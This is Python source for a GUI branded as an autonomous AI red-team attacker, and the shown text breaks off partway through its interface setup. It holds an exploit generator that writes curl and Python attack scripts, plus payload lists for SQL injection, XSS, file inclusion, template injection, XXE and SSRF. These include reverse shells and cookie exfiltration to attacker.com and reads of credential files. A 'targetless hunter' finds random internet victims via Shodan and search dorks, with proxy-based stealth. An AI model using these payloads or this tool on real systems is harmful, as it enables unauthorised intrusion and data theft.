"""
AI-Powered Web Security Scanner - GUI Application
=================================================

Modern, accessible GUI for the security scanner with:
- Cyberpunk/Red Team Aesthetic
- Real-time logs & Progress tracking
- ONE-CLICK FLASH ATTACK
- Exploit Generation
- Report Management

Usage:
    python scanner_gui.py
"""

import tkinter as tk
from tkinter import ttk, scrolledtext, filedialog, messagebox
import threading
import os
import sys
import glob
import json
from datetime import datetime

# Add parent directory to path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from autonomous_scan import SecurityAuditor, Finding
from utils.proxy_fetcher import ProxyFetcher
from utils.target_hunter import TargetHunter
from utils.vulnerability_database import VULNERABILITY_DATABASE

class ToolTip(object):
    """
    create a tooltip for a given widget
    """
    def __init__(self, widget, text='widget info'):
        self.wait_time = 500     # miliseconds
        self.wrap_length = 180   # pixels
        self.widget = widget     # FIX: Assign widget to self.widget
        self.text = text
        self.widget.bind("<Enter>", self.enter)
        self.widget.bind("<Leave>", self.leave)
        self.widget.bind("<ButtonPress>", self.leave)
        self.id = None
        self.tw = None

    def enter(self, event=None):
        self.schedule()

    def leave(self, event=None):
        self.unschedule()
        self.hidetip()

    def schedule(self):
        self.unschedule()
        self.id = self.widget.after(self.wait_time, self.showtip)

    def unschedule(self):
        id = self.id
        self.id = None
        if id:
            self.widget.after_cancel(id)

    def showtip(self, event=None):
        x = y = 0
        x, y, cx, cy = self.widget.bbox("insert")
        x += self.widget.winfo_rootx() + 25
        y += self.widget.winfo_rooty() + 20
        # creates a toplevel window
        self.tw = tk.Toplevel(self.widget)
        # Leaves only the label and removes the app window
        self.tw.wm_overrideredirect(True)
        self.tw.wm_geometry("+%d+%d" % (x, y))
        label = tk.Label(self.tw, text=self.text, justify='left',
                       background="#ffffff", relief='solid', borderwidth=1,
                       wraplength = self.wrap_length)
        label.pack(ipadx=1)

    def hidetip(self):
        tw = self.tw
        self.tw= None
        if tw:
            tw.destroy()


class ExploitGenerator:
    """Generates ready-to-use exploits from vulnerability data"""
    
    @staticmethod
    def generate_curl(vuln):
        """Generate a curl command for the exploit"""
        url = vuln.get('url', 'http://target.com')
        method = vuln.get('method', 'GET')
        payload = vuln.get('payload', '')
        param = vuln.get('parameter', 'q')
        
        if method == 'GET':
            separator = '&' if '?' in url else '?'
            if '=' in payload:
                full_url = f"{url}{separator}{payload}"
            else:
                full_url = f"{url}{separator}{param}={payload}"
            return f"curl -v '{full_url}'"
        
        elif method == 'POST':
            if '=' in payload or '{' in payload:
                data = payload
            else:
                data = f"{param}={payload}"
            return f"curl -v -X POST '{url}' -d '{data}'"
            
        return f"# Method {method} not supported for auto-generation"

    @staticmethod
    def generate_python(vuln):
        """Generate a Python script for the exploit"""
        url = vuln.get('url', 'http://target.com')
        method = vuln.get('method', 'GET')
        payload = vuln.get('payload', '')
        param = vuln.get('parameter', 'q')
        
        script = f"""import requests

target_url = "{url}"
payload = "{payload}"

print(f"[*] Exploiting {vuln.get('type', 'Vulnerability')}...")
"""
        if method == 'GET':
            if '=' in payload:
                script += f"""
full_url = f"{{target_url}}?{{payload}}" if "?" not in target_url else f"{{target_url}}&{{payload}}"
response = requests.get(full_url)
"""
            else:
                script += f"""
params = {{'{param}': payload}}
response = requests.get(target_url, params=params)
"""
        elif method == 'POST':
            script += f"""
data = payload 
response = requests.post(target_url, data=data, headers={{'Content-Type': 'application/x-www-form-urlencoded'}})
"""
        script += """
print(f"[*] Status Code: {response.status_code}")
if response.status_code == 200:
    print("[+] Exploit sent successfully!")
else:
    print("[-] Server returned error.")
"""
        return script

    @staticmethod
    def get_steps(vuln):
        """Get step-by-step hacking instructions"""
        v_type = vuln.get('type', 'Unknown')
        
        steps = {
            'SQL': [
                "1. Identify the vulnerable parameter.",
                "2. Inject SQL payload to manipulate query.",
                "3. Check for database errors or data leakage.",
                "4. Dump database with UNION SELECT."
            ],
            'XSS': [
                "1. Find reflection point.",
                "2. Inject script payload.",
                "3. Verify execution (alert box).",
                "4. Steal cookies or redirect users."
            ],
            'OSINT': [
                "1. Analyze the exposed file.",
                "2. Look for secrets, keys, or config data.",
                "3. Use data to pivot to other systems."
            ],
            'Upload': [
                "1. Upload a malicious file (e.g., PHP shell).",
                "2. Access the file via the web server.",
                "3. Execute commands on the server."
            ],
            'Prototype': [
                "1. Inject __proto__ or constructor payload.",
                "2. Check if object properties are modified.",
                "3. Escalate to RCE or DoS."
            ],
            'XXE': [
                "1. Inject XML with DOCTYPE definition.",
                "2. Reference external entity (e.g., /etc/passwd).",
                "3. Check response for file content."
            ],
            'SSRF': [
                "1. Inject internal URL (localhost, 127.0.0.1).",
                "2. Check if server fetches the internal resource.",
                "3. Scan internal ports or metadata services."
            ],
            'Deserialization': [
                "1. Identify serialized object (base64, etc.).",
                "2. Generate malicious object (ysoserial).",
                "3. Inject and execute code."
            ]
        }
        
        for key in steps:
            if key.lower() in v_type.lower():
                return "\n".join(steps[key])
                
        return "1. Analyze request.\n2. Replay with payload.\n3. Verify impact.\n4. Report finding."

    @staticmethod
    def get_suggested_payloads(vuln_type):
        """Returns a list of payloads to try manually."""
        payloads = {
            'SQL': [
                "' OR 1=1 --",
                "' OR '1'='1",
                "admin' --",
                "' UNION SELECT 1, version(), user() --",
                "1' ORDER BY 10 --",
                "' AND 1=2 UNION SELECT NULL, NULL, NULL--",
                "1' AND SLEEP(5)--",
                "1' WAITFOR DELAY '00:00:05'--",
                "' OR 'x'='x",
                "1'; DROP TABLE users--",
                "' UNION SELECT NULL, table_name FROM information_schema.tables--",
                "' UNION SELECT username, password FROM users--",
                "admin'/*",
                "' OR 1=1#",
                "1' AND extractvalue(1,concat(0x7e,version()))--"
            ],
            'XSS': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert(1)>",
                "\"><script>alert(1)</script>",
                "javascript:alert(1)",
                "<svg/onload=alert(1)>",
                "<iframe src=javascript:alert(1)>",
                "<body onload=alert(1)>",
                "<input onfocus=alert(1) autofocus>",
                "<select onfocus=alert(1) autofocus>",
                "<textarea onfocus=alert(1) autofocus>",
                "<marquee onstart=alert(1)>",
                "<details open ontoggle=alert(1)>",
                "<img src=x onerror=fetch('http://attacker.com?c='+document.cookie)>",
                "'-alert(1)-'",
                "\";alert(1);//",
                "<script>eval(atob('YWxlcnQoMSk='))</script>",
                "{{constructor.constructor('alert(1)')()}}",
                "<img src=x:alert(1) onerror=eval(src)>"
            ],
            'LFI': [
                "../../../../etc/passwd",
                "....//....//....//etc/passwd",
                "php://filter/convert.base64-encode/resource=index.php",
                "..\\..\\..\\..\\windows\\win.ini",
                "/etc/passwd%00",
                "....//....//....//etc/shadow",
                "php://input",
                "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
                "expect://id",
                "file:///etc/passwd",
                "php://filter/read=string.rot13/resource=index.php",
                "/proc/self/environ",
                "/var/log/apache2/access.log",
                "....//....//....//var/www/html/config.php"
            ],
            'Command': [
                "; id",
                "| whoami",
                "$(cat /etc/passwd)",
                "& ping -c 1 127.0.0.1",
                "`id`",
                "; ls -la",
                "| cat /etc/passwd",
                "&& cat /etc/shadow",
                "; wget http://attacker.com/shell.sh",
                "| nc attacker.com 4444 -e /bin/bash",
                "; curl http://attacker.com/$(whoami)",
                "& powershell -c Get-Process",
                "; bash -i >& /dev/tcp/attacker.com/4444 0>&1"
            ],
            'SSTI': [
                "{{7*7}}",
                "${7*7}",
                "<%= 7*7 %>",
                "{{config}}",
                "{{self}}",
                "{{''.__class__.__mro__[1].__subclasses__()}}",
                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
                "${T(java.lang.Runtime).getRuntime().exec('calc')}",
                "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
                "{{config.items()}}",
                "{{''.class.mro()[1].subclasses()}}",
                "{{request.environ}}"
            ],
            'Prototype': [
                "__proto__[admin]=true",
                "constructor[prototype][isAdmin]=true",
                "__proto__.polluted=true",
                "constructor.prototype.admin=true",
                "__proto__[role]=admin",
                "?__proto__[admin]=true",
                "{\"__proto__\":{\"admin\":true}}",
                "constructor[prototype][authenticated]=true"
            ],
            'XXE': [
                "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
                "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///c:/windows/win.ini'>]><foo>&xxe;</foo>",
                "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://attacker.com/xxe'>]><foo>&xxe;</foo>",
                "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'file:///etc/passwd'><!ENTITY % dtd SYSTEM 'http://attacker.com/evil.dtd'>%dtd;]>",
                "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=index.php'>]><foo>&xxe;</foo>"
            ],
            'SSRF': [
                "http://localhost:80",
                "http://127.0.0.1:22",
                "http://169.254.169.254/latest/meta-data/",
                "http://localhost:3306",
                "http://127.0.0.1:6379",
                "http://[::1]:80",
                "http://0.0.0.0:80",
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "file:///etc/passwd",
                "gopher://127.0.0.1:6379/_FLUSHALL",
                "dict://localhost:11211/stat"
            ],
            'Deserialization': [
                "rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldL... (Java)",
                "Tzo0OiJVc2VyIjoyOntzOjQ6Im5hbWUi... (PHP)",
                "YToxOntzOjQ6InVzZXIiO3M6NToiYWRtaW4iO30= (PHP Base64)",
                "Use ysoserial for Java payloads",
                "Use phpggc for PHP gadget chains"
            ],
            'CSRF': [
                "<html><form action='http://target/change' method='POST'><input name='password' value='hacked'/></form><script>document.forms[0].submit()</script></html>",
                "<img src='http://target/delete?id=1'>",
                "<iframe src='http://target/admin/deleteUser?id=1'></iframe>"
            ],
            'Path': [
                "../../../../etc/passwd",
                "..\\..\\..\\windows\\win.ini",
                "....//....//etc/passwd",
                "..%2F..%2F..%2Fetc%2Fpasswd",
                "..%252F..%252F..%252Fetc%252Fpasswd",
                "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
            ],
            'IDOR': [
                "?id=1 (try id=2, id=999, id=admin)",
                "?user_id=123 (try other IDs)",
                "?document=abc123 (try other UUIDs)",
                "/api/users/1 (try /api/users/2)"
            ],
            'Upload': [
                "shell.php (PHP web shell)",
                "shell.jsp (Java web shell)",
                "shell.aspx (ASP.NET web shell)",
                "image.php.jpg (double extension)",
                "shell.php%00.jpg (null byte)",
                "Use polyglot files (valid image + PHP code)"
            ],
            'NoSQL': [
                "{'$ne': null}",
                "{'$gt': ''}",
                "admin' || '1'=='1",
                "{'$regex': '.*'}",
                "{'username': {'$ne': null}, 'password': {'$ne': null}}"
            ],
            'LDAP': [
                "*",
                "admin)(&(password=*))",
                "*)(&(objectClass=*)",
                "admin)(|(password=*))"
            ],
            'OAuth': [
                "redirect_uri=http://attacker.com",
                "response_type=token",
                "state= (CSRF token bypass)"
            ]
        }
        
        for key, p_list in payloads.items():
            if key.lower() in vuln_type.lower():
                return "\n".join([f"- {p}" for p in p_list])
        
        return "- (No specific payloads available for this type)"


class SecurityScannerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("💀 DRL AI RED TEAM - AUTONOMOUS ATTACKER")
        self.root.geometry("1920x1080")  # Increased default size
        self.root.minsize(1280, 720)    # Increased minimum size to prevent content cutoff
        
        # Cyberpunk / Red Team Theme
        self.colors = {
            "bg_dark": "#0a0a0a",      # Pitch Black
            "bg_panel": "#111111",     # Very Dark Grey
            "accent": "#00ff00",       # Hacker Green
            "accent_dim": "#008f00",   # Dim Green
            "text": "#00ff00",         # Green Text
            "text_dim": "#aaaaaa",     # Grey Text
            "danger": "#ff0000",       # Red
            "warning": "#ffaa00",      # Orange
            "highlight": "#222222"     # Highlight
        }
        
        self.root.configure(bg=self.colors["bg_dark"])
        
        # Variables
        self.target_url = tk.StringVar()
        self.crawl_depth = tk.IntVar(value=30)
        self.test_episodes = tk.IntVar(value=3)
        self.model_path = tk.StringVar(value="dqn_web_sec_model.pth")
        self.scan_mode = tk.StringVar(value="auto")
        self.specific_attack_type = tk.StringVar()
        self.stealth_level = tk.StringVar(value="medium")
        self.proxy_file = tk.StringVar()
        
        self.setup_ui()
        self.load_available_models()
        self.auditor = None

        
    def setup_ui(self):
        """Setup the Cyberpunk UI with Responsive Layout"""
        
        # Custom Style for Progress Bar
        style = ttk.Style()
        style.theme_use('clam')
        style.configure("Horizontal.TProgressbar", foreground=self.colors['accent'], background=self.colors['accent'], troughcolor=self.colors['bg_panel'], bordercolor=self.colors['bg_panel'], lightcolor=self.colors['accent'], darkcolor=self.colors['accent'])
        
        # Header
        header_frame = tk.Frame(self.root, bg=self.colors["bg_dark"], height=70)
        header_frame.pack(fill=tk.X, padx=0, pady=0)
        header_frame.pack_propagate(False)
        
        title_label = tk.Label(
            header_frame,
            text="💀 DRL AI RED TEAM",
            font=("Courier New", 20, "bold"),
            bg=self.colors["bg_dark"],
            fg=self.colors["danger"]
        )
        title_label.pack(side=tk.LEFT, padx=20, pady=10)
        
        subtitle_label = tk.Label(
            header_frame,
            text="AUTONOMOUS VULNERABILITY SCANNER & EXPLOITER",
            font=("Courier New", 10, "bold"),
            bg=self.colors["bg_dark"],
            fg=self.colors["text_dim"]
        )
        subtitle_label.pack(side=tk.LEFT, pady=10)
        
        # Status Bar (Top Right)
        self.status_var = tk.StringVar()
        self.status_var.set("SYSTEM READY")
        self.status_label = tk.Label(header_frame, textvariable=self.status_var, font=("Consolas", 10), bg=self.colors["bg_dark"], fg=self.colors["accent"])
        self.status_label.pack(side=tk.RIGHT, padx=20)

        # Main Layout - PanedWindow for Resizability
        main_pane = tk.PanedWindow(self.root, bg=self.colors["bg_dark"], orient=tk.HORIZONTAL, sashwidth=4, sashrelief=tk.FLAT)
        main_pane.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # === LEFT: MISSION CONTROL (Scrollable) ===
        left_container = tk.Frame(main_pane, bg=self.colors["bg_panel"])
        main_pane.add(left_container, minsize=320, width=350)
        
        # Canvas for scrolling
        self.canvas = tk.Canvas(left_container, bg=self.colors["bg_panel"], highlightthickness=0)
        self.scrollbar = ttk.Scrollbar(left_container, orient="vertical", command=self.canvas.yview)
        self.scrollable_frame = tk.Frame(self.canvas, bg=self.colors["bg_panel"])
        
        self.scrollable_frame.bind(
            "<Configure>",
            lambda e: self.canvas.configure(scrollregion=self.canvas.bbox("all"))
        )
        
        # Create window without fixed width - will resize dynamically
        self.canvas_window = self.canvas.create_window((0, 0), window=self.scrollable_frame, anchor="nw")
        
        # Bind canvas resize to update scrollable frame width
        def on_canvas_resize(event):
            self.canvas.itemconfig(self.canvas_window, width=event.width)
        
        self.canvas.bind("<Configure>", on_canvas_resize)
        self.canvas.configure(yscrollcommand=self.scrollbar.set)
        
        # Enable mousewheel scrolling
        def on_mousewheel(event):
            self.canvas.yview_scroll(int(-1*(event.delta/120)), "units")
        
        self.canvas.bind_all("<MouseWheel>", on_mousewheel)
        
        self.canvas.pack(side="left", fill="both", expand=True)
        self.scrollbar.pack(side="right", fill="y")
        
        # --- Control Widgets in Scrollable Frame ---
        self.add_section_header(self.scrollable_frame, "🎯 MISSION PARAMETERS")
        self.create_input_field(self.scrollable_frame, "TARGET URL:", self.target_url, "localhost:5001")
        self.create_slider_field(self.scrollable_frame, "CRAWL DEPTH:", self.crawl_depth, 1, 100, 30, "Rec: 30 for new sites, 100+ for deep scan")
        self.create_slider_field(self.scrollable_frame, "ATTACK INTENSITY:", self.test_episodes, 1, 10, 3, "Rec: 2 for new sites, 3 standard, 5 aggressive")
        self.create_model_selector(self.scrollable_frame)
        
        # SCAN MODES
        self.add_section_header(self.scrollable_frame, "⚙️ SCAN MODE")
        
        modes_frame = tk.Frame(self.scrollable_frame, bg=self.colors["bg_panel"])
        modes_frame.pack(fill=tk.X, padx=15, pady=5)
        
        tk.Radiobutton(modes_frame, text="🤖 FULL AUTO (AI AGENT)", variable=self.scan_mode, value="auto", bg=self.colors["bg_panel"], fg=self.colors["text"], selectcolor=self.colors["bg_dark"], activebackground=self.colors["bg_panel"], activeforeground=self.colors["accent"], font=("Consolas", 9), command=self.toggle_attack_selector).pack(anchor=tk.W)
        tk.Radiobutton(modes_frame, text="🔥 AGGRESSIVE MODE", variable=self.scan_mode, value="aggressive", bg=self.colors["bg_panel"], fg=self.colors["danger"], selectcolor=self.colors["bg_dark"], activebackground=self.colors["bg_panel"], activeforeground=self.colors["danger"], font=("Consolas", 9, "bold"), command=self.toggle_attack_selector).pack(anchor=tk.W)
        tk.Radiobutton(modes_frame, text="🕵️ SUPER OSINT MODE", variable=self.scan_mode, value="osint", bg=self.colors["bg_panel"], fg=self.colors["text"], selectcolor=self.colors["bg_dark"], activebackground=self.colors["bg_panel"], activeforeground=self.colors["accent"], font=("Consolas", 9), command=self.toggle_attack_selector).pack(anchor=tk.W)
        tk.Radiobutton(modes_frame, text="🎯 SPECIFIC ATTACK", variable=self.scan_mode, value="specific", bg=self.colors["bg_panel"], fg=self.colors["text"], selectcolor=self.colors["bg_dark"], activebackground=self.colors["bg_panel"], activeforeground=self.colors["accent"], font=("Consolas", 9), command=self.toggle_attack_selector).pack(anchor=tk.W)
        tk.Radiobutton(modes_frame, text="💀 ZERO-DAY HUNTER", variable=self.scan_mode, value="zeroday", bg=self.colors["bg_panel"], fg=self.colors["warning"], selectcolor=self.colors["bg_dark"], activebackground=self.colors["bg_panel"], activeforeground=self.colors["warning"], font=("Consolas", 9, "bold"), command=self.toggle_attack_selector).pack(anchor=tk.W)
        tk.Radiobutton(modes_frame, text="🌍 TARGETLESS HUNTER", variable=self.scan_mode, value="targetless", bg=self.colors["bg_panel"], fg="#00ffff", selectcolor=self.colors["bg_dark"], activebackground=self.colors["bg_panel"], activeforeground="#00ffff", font=("Consolas", 9, "bold"), command=self.toggle_attack_selector).pack(anchor=tk.W)
        
        # Attack Selector (Hidden by default)
        self.attack_frame = tk.Frame(self.scrollable_frame, bg=self.colors["bg_panel"])
        self.attack_frame.pack(fill=tk.X, padx=15, pady=5)
        tk.Label(self.attack_frame, text="ATTACK TYPE:", font=("Courier New", 9, "bold"), bg=self.colors["bg_panel"], fg=self.colors["text"]).pack(anchor=tk.W)
        self.attack_combo = ttk.Combobox(self.attack_frame, textvariable=self.specific_attack_type, state="readonly")
        self.attack_combo['values'] = ["SQL Injection", "XSS", "SSRF", "Command Injection", "LFI", "RFI", "Broken Access Control", "XXE"]
        self.attack_combo.current(0)
        self.attack_combo.pack(fill=tk.X)
        self.attack_combo.config(state=tk.DISABLED)

        # Target Discovery (Hidden by default)
        self.discovery_section_header = tk.Label(
            self.scrollable_frame, 
            text="🎯 TARGET DISCOVERY", 
            font=("Courier New", 12, "bold"), 
            bg=self.colors["bg_panel"], 
            fg=self.colors["text_dim"]
        )
        
        self.discovery_frame = tk.Frame(self.scrollable_frame, bg=self.colors["bg_panel"])
        
        # Load environment variables
        from dotenv import load_dotenv
        load_dotenv()
        
        self.dork_query = tk.StringVar()
        self.shodan_query = tk.StringVar()
        self.shodan_key = tk.StringVar(value=os.getenv("SHODAN_API_KEY", ""))
        self.crtsh_domain = tk.StringVar()
        self.duckduckgo_query = tk.StringVar()
        self.censys_query = tk.StringVar()
        self.censys_query = tk.StringVar()
        self.censys_api_key = tk.StringVar(value=os.getenv("CENSYS_API_KEY", ""))
        
        # Grid layout for discovery frame with random buttons
        # Google Dork
        tk.Label(self.discovery_frame, text="GOOGLE DORK:", font=("Courier New", 9, "bold"), bg=self.colors["bg_panel"], fg=self.colors["text"]).grid(row=0, column=0, sticky="w", padx=5, pady=2)
        tk.Entry(self.discovery_frame, textvariable=self.dork_query, font=("Consolas", 9), bg="black", fg="white", relief=tk.FLAT, insertbackground="white").grid(row=0, column=1, sticky="ew", padx=5, pady=2)
        tk.Button(self.discovery_frame, text="🎲", font=("Consolas", 10), bg=self.colors["accent"], fg="black", relief=tk.FLAT, cursor="hand2", width=3, command=lambda: self.random_query("dork")).grid(row=0, column=2, padx=(0, 5), pady=2)
        
        # Shodan Query
        tk.Label(self.discovery_frame, text="SHODAN QUERY:", font=("Courier New", 9, "bold"), bg=self.colors["bg_panel"], fg=self.colors["text"]).grid(row=1, column=0, sticky="w", padx=5, pady=2)
        tk.Entry(self.discovery_frame, textvariable=self.shodan_query, font=("Consolas", 9), bg="black", fg="white", relief=tk.FLAT, insertbackground="white").grid(row=1, column=1, sticky="ew", padx=5, pady=2)
        tk.Button(self.discovery_frame, text="🎲", font=("Consolas", 10), bg=self.colors["accent"], fg="black", relief=tk.FLAT, cursor="hand2", width=3, command=lambda: self.random_query("shodan")).grid(row=1, column=2, padx=(0, 5), pady=2)
        
        # Shodan Key (no random button)
        tk.Label(self.discovery_frame, text="SHODAN KEY:", font=("Courier New", 9, "bold"), bg=self.colors["bg_panel"], fg=self.colors["text"]).grid(row=2, column=0, sticky="w", padx=5, pady=2)
        tk.Entry(self.discovery_frame, textvariable=self.shodan_key, font=("Consolas", 9), bg="black", fg="white", relief=tk.FLAT, insertbackground="white", show="*").grid(row=2, column=1, columnspan=2, sticky="ew", padx=5, pady=2)
        
        # CRT.sh Domain
        tk.Label(self.discovery_frame, text="CRT.SH DOMAIN:", font=("Courier New", 9, "bold"), bg=self.colors["bg_panel"], fg=self.colors["text"]).grid(row=3, column=0, sticky="w", padx=5, pady=2)
        tk.Entry(self.discovery_frame, textvariable=self.crtsh_domain, font=("Consolas", 9), bg="black", fg="white", relief=tk.FLAT, insertbackground="white").grid(row=3, column=1, sticky="ew", padx=5, pady=2)
        tk.Button(self.discovery_frame, text="🎲", font=("Consolas", 10), bg=self.colors["accent"], fg="black", relief=tk.FLAT, cursor="hand2", width=3, command=lambda: self.random_query("crtsh")).grid(row=3, column=2, padx=(0, 5), pady=2)
        
        # DuckDuckGo
        tk.Label(self.discovery_frame, text="DUCKDUCKGO:", font=("Courier New", 9, "bold"), bg=self.colors["bg_panel"], fg=self.colors["text"]).grid(row=4, column=0, sticky="w", padx=5, pady=2)
        tk.Entry(self.discovery_frame, textvariable=self.duckduckgo_query, font=("Consolas", 9), bg="black", fg="white", relief=tk.FLAT, insertbackground="white").grid(row=4, column=1, sticky="ew", padx=5, pady=2)
        tk.Button(self.discovery_frame, text="🎲", font=("Consolas", 10), bg=self.colors["accent"], fg="black", relief=tk.FLAT, cursor="hand2", width=3, command=lambda: self.random_query("duckduckgo")).grid(row=4, column=2, padx=(0, 5), pady=2)
        
        # Censys Query
        tk.Label(self.discovery_frame, text="CENSYS QUERY:", font=("Courier New", 9, "bold"), bg=self.colors["bg_panel"], fg=self.colors["text"]).grid(row=5, column=0, sticky="w", padx=5, pady=2)
        tk.Entry(self.discovery_frame, textvariable=self.censys_query, font=("Consolas", 9), bg="black", fg="white", relief=tk.FLAT, insertbackground="white").grid(row=5, column=1, sticky="ew", padx=5, pady=2)
        tk.Button(self.discovery_frame, text="🎲", font=("Consolas", 10), bg=self.colors["accent"], fg="black", relief=tk.FLAT, cursor="hand2", width=3, command=lambda: self.random_query("censys")).grid(row=5, column=2, padx=(0, 5), pady=2)
        
        # Censys API Key (PAT)
        tk.Label(self.discovery_frame, text="CENSYS API KEY:", font=("Courier New", 9, "bold"), bg=self.colors["bg_panel"], fg=self.colors["text"]).grid(row=6, column=0, sticky="w", padx=5, pady=2)
        tk.Entry(self.discovery_frame, textvariable=self.censys_api_key, font=("Consolas", 9), bg="black", fg="white", relief=tk.FLAT, insertbackground="white", show="*").grid(row=6, column=1, columnspan=2, sticky="ew", padx=5, pady=2)
        
        # Add auto-generate hint
        auto_hint = tk.Label(
            self.discovery_frame, 
            text="💡 Tip: Leave fields empty to use AUTO-GENERATE mode (100+ queries)", 
            font=("Consolas", 8, "italic"), 
            bg=self.colors["bg_panel"], 
            fg=self.colors["accent_dim"]
        )
        auto_hint.grid(row=7, column=0, columnspan=2, sticky="w", padx=5, pady=(10, 2))
        
        # Add Preview Queries button
        preview_btn = tk.Button(
            self.discovery_frame,
            text="🔍 PREVIEW AUTO-GENERATED QUERIES",
            font=("Courier New", 9, "bold"),
            bg=self.colors["accent_dim"],
            fg="black",
            relief=tk.FLAT,
            cursor="hand2",
            command=self.preview_queries
        )
        preview_btn.grid(row=9, column=0, columnspan=2, sticky="ew", padx=5, pady=(5, 10))
        
        self.discovery_frame.columnconfigure(1, weight=1)
        # Don't pack yet - will be shown when targetless mode is selected

        # STEALTH CONFIGURATION
        self.add_section_header(self.scrollable_frame, "🥷 STEALTH CONFIGURATION")
        
        stealth_frame = tk.Frame(self.scrollable_frame, bg=self.colors["bg_panel"])
        stealth_frame.pack(fill=tk.X, padx=15, pady=5)
        
        tk.Label(stealth_frame, text="STEALTH LEVEL:", font=("Courier New", 9, "bold"), bg=self.colors["bg_panel"], fg=self.colors["text"]).pack(anchor=tk.W)
        stealth_combo = ttk.Combobox(stealth_frame, textvariable=self.stealth_level, state="readonly", width=15)
        stealth_combo['values'] = ["low", "medium", "high", "paranoid"]
        stealth_combo.current(1)  # Default to medium
        stealth_combo.pack(fill=tk.X)
        
        tk.Label(stealth_frame, text="PROXY FILE (Optional):", font=("Courier New", 9, "bold"), bg=self.colors["bg_panel"], fg=self.colors["text"]).pack(anchor=tk.W, pady=(10, 0))
        proxy_frame = tk.Frame(stealth_frame, bg=self.colors["bg_panel"])
        proxy_frame.pack(fill=tk.X)
        proxy_entry = tk.Entry(proxy_frame, textvariable=self.proxy_file, font=("Consolas", 9), bg="black", fg="white", relief=tk.FLAT, insertbackground="white")
        proxy_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, ipady=3)
        
        proxy_fetch_btn = tk.Button(proxy_frame, text="🔄", font=("Consolas", 8), command=self.fetch_proxies, bg=self.colors["accent"], fg="black", relief=tk.FLAT, width=3)
        proxy_fetch_btn.pack(side=tk.RIGHT, padx=(5, 0))
        ToolTip(proxy_fetch_btn, "Auto-fetch free proxies")
        
        proxy_browse_btn = tk.Button(proxy_frame, text="📂", font=("Consolas", 8), command=self.browse_proxy_file, bg=self.colors["highlight"], fg="white", relief=tk.FLAT, width=3)
        proxy_browse_btn.pack(side=tk.RIGHT, padx=(5, 0))
        ToolTip(proxy_browse_btn, "Browse for proxy file")
        
        tk.Frame(self.scrollable_frame, bg=self.colors["bg_panel"], height=20).pack() # Spacer
        
        # ONE CLICK BUTTONS
        self.flash_btn = tk.Button(self.scrollable_frame, text="⚡ FLASH ATTACK (ONE-CLICK)", font=("Courier New", 12, "bold"), bg=self.colors["accent"], fg="black", activebackground="white", activeforeground="black", relief=tk.FLAT, cursor="hand2", command=self.flash_attack, height=2)
        self.flash_btn.pack(pady=5, padx=15, fill=tk.X)
        
        self.scan_button = tk.Button(self.scrollable_frame, text="🚀 LAUNCH SCAN", font=("Courier New", 11, "bold"), bg=self.colors["highlight"], fg=self.colors["accent"], relief=tk.FLAT, cursor="hand2", command=self.start_scan, height=2)
        self.scan_button.pack(pady=5, padx=15, fill=tk.X)
        
        self.stop_button = tk.Button(self.scrollable_frame, text="⏹️ ABORT MISSION", font=("Courier New", 11, "bold"), bg=self.colors["danger"], fg="white", relief=tk.FLAT, cursor="hand2", command=self.stop_scan, height=2, state=tk.DISABLED)
        self.stop_button.pack(pady=(5, 15), padx=15, fill=tk.X)
        
        # === MIDDLE: TERMINAL & INTEL ===
        middle_panel = tk.Frame(main_pane, bg=self.colors["bg_panel"])
        main_pane.add(middle_panel, minsize=400, width=500)
        
        # Split Middle Panel Vertically
        middle_pane_vertical = tk.PanedWindow(middle_panel, bg=self.colors["bg_panel"], orient=tk.VERTICAL, sashwidth=4, sashrelief=tk.FLAT)
        middle_pane_vertical.pack(fill=tk.BOTH, expand=True)
        
        # Terminal Section
        terminal_frame = tk.Frame(middle_pane_vertical, bg=self.colors["bg_panel"])
        middle_pane_vertical.add(terminal_frame, minsize=200, height=300)
        
        self.add_section_header(terminal_frame, "📟 LIVE TERMINAL LOGS")
        self.progress = ttk.Progressbar(terminal_frame, mode='indeterminate', style="Horizontal.TProgressbar")
        self.progress.pack(pady=5, padx=15, fill=tk.X)
        
        self.output_text = scrolledtext.ScrolledText(terminal_frame, wrap=tk.WORD, font=("Consolas", 9), bg="black", fg=self.colors["text"], relief=tk.FLAT, insertbackground=self.colors["accent"])
        self.output_text.pack(pady=10, padx=15, fill=tk.BOTH, expand=True)
        
        # Findings Section
        findings_frame_container = tk.Frame(middle_pane_vertical, bg=self.colors["bg_panel"])
        middle_pane_vertical.add(findings_frame_container, minsize=200)
        
        self.add_section_header(findings_frame_container, "🚨 DETECTED VULNERABILITIES")
        
        findings_list_frame = tk.Frame(findings_frame_container, bg="black")
        findings_list_frame.pack(pady=10, padx=15, fill=tk.BOTH, expand=True)
        
        scrollbar_findings = tk.Scrollbar(findings_list_frame)
        scrollbar_findings.pack(side=tk.RIGHT, fill=tk.Y)
        
        self.findings_list = tk.Listbox(findings_list_frame, font=("Consolas", 10), bg="black", fg=self.colors["warning"], selectbackground=self.colors["accent"], selectforeground="black", relief=tk.FLAT, yscrollcommand=scrollbar_findings.set)
        self.findings_list.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar_findings.config(command=self.findings_list.yview)
        
        self.findings_list.bind('<<ListboxSelect>>', self.on_finding_select)
        
        # === RIGHT: WEAPONIZATION ===
        right_panel = tk.Frame(main_pane, bg=self.colors["bg_panel"])
        main_pane.add(right_panel, minsize=350, width=400)
        
        self.add_section_header(right_panel, "💣 EXPLOIT FACTORY")
        
        self.exploit_text = scrolledtext.ScrolledText(right_panel, wrap=tk.WORD, font=("Consolas", 10), bg="black", fg=self.colors["danger"], relief=tk.FLAT, insertbackground="white")
